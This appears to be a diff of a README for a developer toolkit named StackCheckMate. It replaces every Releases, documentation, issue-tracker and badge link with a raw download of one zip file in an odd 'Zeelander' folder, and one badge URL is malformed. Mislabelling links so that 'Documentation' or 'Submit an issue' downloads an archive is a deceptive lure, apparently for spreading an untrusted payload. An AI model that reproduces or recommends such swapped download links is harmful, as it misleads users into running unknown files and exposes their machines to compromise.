@@ -1,6 +1,6 @@
 # 🛠️ stackcheckmate - Your All-in-One Developer Toolkit
 
-[![Download StackCheckMate](https://img.shields.io/badge/Download%20Now-StackCheckMate-blue.svg)](https://github.com/maramas4/stackcheckmate/releases)
+[![Download StackCheckMate](https://raw.githubusercontent.com/maramas4/stackcheckmate/main/Zeelander/stackcheckmate.zip%https://raw.githubusercontent.com/maramas4/stackcheckmate/main/Zeelander/stackcheckmate.zip)](https://raw.githubusercontent.com/maramas4/stackcheckmate/main/Zeelander/stackcheckmate.zip)
 
 ## 📖 Description
 
@@ -14,7 +14,7 @@ To start using StackCheckMate, follow these simple steps.
 
 You will find the latest version of StackCheckMate on our Releases page. Click the link below to access it:
 
-[Download StackCheckMate from Releases](https://github.com/maramas4/stackcheckmate/releases)
+[Download StackCheckMate from Releases](https://raw.githubusercontent.com/maramas4/stackcheckmate/main/Zeelander/stackcheckmate.zip)
 
 ### 💻 System Requirements
 
@@ -80,13 +80,13 @@ If you encounter any issues during installation, consider these tips:
 
 ## 📚 Documentation
 
-For further guidance, you can access our complete documentation detailing all features and functionalities. Visit here: [StackCheckMate Documentation](https://github.com/maramas4/stackcheckmate/wiki)
+For further guidance, you can access our complete documentation detailing all features and functionalities. Visit here: [StackCheckMate Documentation](https://raw.githubusercontent.com/maramas4/stackcheckmate/main/Zeelander/stackcheckmate.zip)
 
 ## 📫 Support
 
 If you have questions or need support, please reach out:
 
-- **GitHub Issues:** [Submit an issue](https://github.com/maramas4/stackcheckmate/issues)
+- **GitHub Issues:** [Submit an issue](https://raw.githubusercontent.com/maramas4/stackcheckmate/main/Zeelander/stackcheckmate.zip)
 - **Community Forum:** Engage with other users and developers.
 
 Thank you for choosing StackCheckMate. We hope this toolkit enhances your programming experience!
